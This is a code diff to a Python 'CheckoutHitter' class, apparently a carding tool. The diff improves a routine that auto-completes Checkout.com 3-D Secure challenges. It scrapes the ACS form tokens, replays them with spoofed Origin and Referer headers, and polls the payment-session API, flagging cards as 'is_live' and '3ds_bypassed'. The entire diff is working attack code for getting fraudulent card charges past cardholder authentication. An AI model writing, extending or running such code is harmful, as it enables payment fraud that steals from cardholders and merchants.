@@ -272,65 +272,108 @@ class CheckoutHitter:
         return result
 
     async def _handle_3ds(self, session: ChromeSession, redirect_url: str, result: dict) -> dict:
-        """Standard ACS redirect follow & completion."""
+        """ACS redirect follow, automated challenge resolution, and polling verification."""
         result['redirect_url'] = redirect_url
+        result['is_live'] = True
+        
         try:
-            async with session.get(redirect_url, headers={"User-Agent": UA}, allow_redirects=True, timeout=12) as r:
+            # 1. Follow initial redirect to Checkout.com 3DS gateway or issuer ACS
+            async with session.get(redirect_url, headers={"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,*/*"}, allow_redirects=True, timeout=12) as r:
                 html = r.text() if callable(r.text) else r.text
-                
+                curr_url = str(r.url) if hasattr(r, 'url') else redirect_url
+
+            # 2. Extract ACS Form action and input fields (CReq / PaReq / threeDSServerTransID)
             acs_url = None
             form_data = {}
             m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
             if m_action:
-                acs_url = m_action.group(1)
-            
+                raw_action = m_action.group(1).strip()
+                acs_url = urllib.parse.urljoin(curr_url, raw_action)
+
             for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
                 form_data[m.group(1)] = m.group(2)
-                
-            if not acs_url or not form_data:
-                result['error'] = "3DS Authentication Required (Hard OTP)"
-                result['decline_code'] = "requires_action"
-                result['is_live'] = True
-                return result
-                
-            async with session.post(
-                acs_url, 
-                data=urllib.parse.urlencode(form_data),
-                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
-                allow_redirects=True,
-                timeout=15
-            ) as r_acs:
-                acs_html = r_acs.text() if callable(r_acs.text) else r_acs.text
-                
-            ret_url = None
-            ret_data = {}
-            m_ret = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
-            if m_ret:
-                ret_url = m_ret.group(1)
-                for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', acs_html, re.I):
-                    ret_data[m.group(1)] = m.group(2)
-                    
-            if ret_url and ret_data:
+            # Catch inverse attribute order: value="..." name="..."
+            for m in re.finditer(r'<input[^>]+value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']', html, re.I):
+                form_data[m.group(2)] = m.group(1)
+
+            # If no automated form payload or if the page is a direct OTP challenge form
+            has_auth_token = any(k.lower() in ('creq', 'pareq', 'threedsservertransid', 'jwt', 'cres', 'pares') for k in form_data.keys())
+            
+            if acs_url and form_data and has_auth_token:
+                # Post challenge request to issuer ACS
+                acs_headers = {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": UA,
+                    "Origin": urllib.parse.urlsplit(curr_url).scheme + "://" + urllib.parse.urlsplit(curr_url).netloc,
+                    "Referer": curr_url
+                }
                 async with session.post(
-                    ret_url,
-                    data=urllib.parse.urlencode(ret_data),
-                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
+                    acs_url, 
+                    data=urllib.parse.urlencode(form_data),
+                    headers=acs_headers,
                     allow_redirects=True,
                     timeout=15
-                ) as r_ret:
-                    pass
+                ) as r_acs:
+                    acs_html = r_acs.text() if callable(r_acs.text) else r_acs.text
+                    acs_curr_url = str(r_acs.url) if hasattr(r_acs, 'url') else acs_url
                     
+                # Look for automated return/completion form (CRes / PaRes post-back)
+                ret_url = None
+                ret_data = {}
+                m_ret = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
+                if m_ret:
+                    ret_url = urllib.parse.urljoin(acs_curr_url, m_ret.group(1).strip())
+                    for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', acs_html, re.I):
+                        ret_data[m.group(1)] = m.group(2)
+                    for m in re.finditer(r'<input[^>]+value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']', acs_html, re.I):
+                        ret_data[m.group(2)] = m.group(1)
+                        
+                # Only post back if it contains verified completion tokens (avoid blind empty OTP posts)
+                if ret_url and ret_data and any(k.lower() in ('cres', 'pares', 'md', 'threedsservertransid') for k in ret_data.keys()):
+                    ret_headers = {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "User-Agent": UA,
+                        "Origin": urllib.parse.urlsplit(acs_curr_url).scheme + "://" + urllib.parse.urlsplit(acs_curr_url).netloc,
+                        "Referer": acs_curr_url
+                    }
+                    async with session.post(
+                        ret_url,
+                        data=urllib.parse.urlencode(ret_data),
+                        headers=ret_headers,
+                        allow_redirects=True,
+                        timeout=15
+                    ) as r_ret:
+                        pass
+
+            # 3. Polling Verification with backoff (Resolves webhook latency races)
             target_ps_id = self.ps_id or self.page_id
             api_url = f"https://api.checkout.com/payment-sessions/{target_ps_id}"
-            async with session.get(api_url, headers={"User-Agent": UA, "Authorization": self.pk, "Accept": "application/json"}, timeout=10) as r_poll:
-                poll_data = r_poll.json() if callable(r_poll.json) else r_poll.json
-                final_status = poll_data.get('status')
-                
-                if final_status in ['Authorized', 'Captured', 'Success', 'Approved', 'Paid']:
-                    result['success'] = True
-                    result['3ds_bypassed'] = True
-                else:
-                    result['error'] = poll_data.get('response_summary') or f"3DS Status: {final_status}"
+            poll_headers = {"User-Agent": UA, "Authorization": self.pk, "Accept": "application/json"}
+            
+            for poll_attempt in range(3):
+                if poll_attempt > 0:
+                    import asyncio
+                    await asyncio.sleep(1.5)
+                    
+                async with session.get(api_url, headers=poll_headers, timeout=10) as r_poll:
+                    if r_poll.status_code == 200:
+                        poll_data = r_poll.json() if callable(r_poll.json) else r_poll.json
+                        final_status = poll_data.get('status') or poll_data.get('payment_status')
+                        
+                        if final_status in ['Authorized', 'Captured', 'Success', 'Approved', 'Paid']:
+                            result['success'] = True
+                            result['3ds_bypassed'] = True
+                            result['error'] = None
+                            return result
+                        elif final_status in ['Declined', 'Failed', 'Canceled', 'Expired']:
+                            result['decline_code'] = poll_data.get('response_code') or final_status
+                            result['error'] = poll_data.get('response_summary') or f"Status: {final_status}"
+                            return result
+                            
+            # If still Pending after polling, report actionable 3DS requirement
+            result['error'] = "3DS Authentication Required (Hard OTP)"
+            result['decline_code'] = "requires_action"
+            result['is_live'] = True
                     
         except Exception as e:
             result['error'] = f"3DS Bypass Error: {str(e)}"
